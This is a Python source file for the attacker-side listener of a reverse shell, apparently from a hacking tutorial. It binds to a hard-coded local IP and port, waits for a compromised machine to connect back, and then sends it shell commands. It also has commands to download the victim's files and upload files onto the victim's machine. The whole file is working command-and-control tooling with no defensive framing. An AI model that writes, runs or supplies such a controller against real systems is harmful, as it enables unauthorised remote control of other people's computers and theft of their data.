#!/usr/bin/python

import socket
import subprocess
import json
import base64
import sys

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Enables the option that allows reuse of sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        # It is the number of connection that can be queued
        listener.listen(0)
        print("Waiting for Incoming Connection")
        # To accept connections that come to this port
        self.connection, address = listener.accept()
        print("[+] Got Connection" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content) # Will append contents of file in a form of list like ["upload"],["path"],["contents of file"].

            command_result = self.execute_commands(command)
            if command[0] == "download" and "[-]" not in command_result:
                command_result = self.write_file(command[1], command_result)


            print(command_result)

my_listener = Listener("192.168.43.198", 5555)
my_listener.run()
